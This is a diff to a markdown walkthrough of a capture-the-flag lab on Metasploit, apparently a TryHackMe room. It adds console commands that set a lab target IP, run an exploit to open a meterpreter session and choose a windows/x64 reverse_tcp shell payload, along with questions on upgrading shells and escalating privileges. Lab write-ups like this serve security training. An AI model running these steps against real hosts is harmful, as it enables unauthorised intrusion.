@@ -71,18 +71,49 @@ show options reveals the RHOSTS needs to be set_
 U_sually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
 With that done, run the exploit!_
 
-Task 3
+
+set rhosts 10.10.76.171
+
+run
+or
+exploit 
+
+meterpreter 1 session opened > 
+
+
+
+set payload windows/x64/shell/reverse_tcp
+
+
+## Task 3 **Escalate privileges, learn how to upgrade shells in metasploit.**
+Question 1 : 
+
+_If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)_
+
+
+## Question 2:
+_Select this (use MODULEPATH). Show options, what option are we required to change?_
+
+
+## Question 3:
+_Set the required option, you may need to list all of the sessions to find your target here._ 
+
+
+**Question 4##**###
 
 
 
 
-Task 4 
+Run! If this doesn't work, try completing the exploit from the previous task once more.
+
+
+## Task 4
 
 
 
 
 
-Task 5
+## Task 5
 
 
 
